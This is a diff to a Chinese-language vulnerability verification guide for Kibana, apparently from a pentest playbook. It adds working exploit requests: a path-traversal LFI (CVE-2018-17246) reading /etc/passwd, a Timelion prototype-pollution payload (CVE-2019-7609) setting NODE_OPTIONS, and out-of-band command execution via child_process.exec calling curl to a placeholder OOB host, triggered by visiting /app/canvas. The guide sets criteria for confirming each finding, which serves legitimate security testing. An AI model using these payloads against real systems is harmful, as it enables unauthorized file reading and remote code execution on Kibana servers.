@@ -98,18 +98,31 @@ curl -s "http://target:5601/api/console/api_server?sense_version=@@SENSE_VERSION
 ## 验证方法
 
 ```bash
-# 验证Kibana未授权访问
-curl -s -o /dev/null -w "%{http_code}" http://target:5601/api/status
-# 返回200表示无需认证
+# 未授权访问：响应体是 status JSON，含 version.number、name、status.overall.level 等键
+curl -s http://target:5601/api/status
+# 反例：401/403，或响应体为 Kibana 登录页 HTML → 已启用 X-Pack Security
 
-# 验证Timelion功能可用
-curl -s -o /dev/null -w "%{http_code}" -X POST "http://target:5601/api/timelion/run" \
+# LFI (CVE-2018-17246)：响应体出现系统文件特征
+curl -s "http://target:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../etc/passwd" \
+  -H "kbn-xsrf: true"
+# 判据：响应体出现 root:x:0:0: 或 /bin/bash 行；出现 Kibana 报错 JSON / HTML 页面都不是证据
+
+# Timelion 原型链污染 (CVE-2019-7609) 存在性判定：分两次调用 /api/timelion/run
+# 第一次按 ## Payload 注入上面的 AAAA 语句，第二次注入 NODE_OPTIONS
+curl -s -X POST "http://target:5601/api/timelion/run" \
   -H "Content-Type: application/json" \
   -H "kbn-xsrf: true" \
-  -d '{"sheet":[".es(*)"],"time":{"from":"now-1y","to":"now"}}'
-# 返回200表示Timelion可用
+  -d '{"sheet":[".es(*).props(label.__proto__.env.NODE_OPTIONS=\"--require /proc/self/environ\")"],"time":{"from":"now-1y","to":"now"}}'
+# 判据：两次请求的响应体都是 Timelion 正常执行的结果 JSON（含 sheet 数组），
+#      且注入语句被当作合法表达式接受、响应体里不出现 "Invalid" / 参数校验报错
+# 反例：返回 400 语法错误或 403；只看到接口返回 200 不算，因为无回显路径
+# 该漏洞无直接回显，命令执行证据按带外确认：把 AAAA 里的 exec 换成
+#   require("child_process").exec("curl http://OOB_DOMAIN/POC_TOKEN")
+# 再访问 /app/canvas 触发，判据是 OOB 侧收到携带 POC_TOKEN 的请求
+curl -s "http://target:5601/app/canvas" -H "kbn-xsrf: true"
+# 反例：OOB 侧一直没收到请求 → 不存在，不要换更重的 payload
 
-# 通过版本判断是否受影响
+# 版本判断
 curl -s http://target:5601/api/status | grep -o '"number":"[^"]*"'
 ```
 
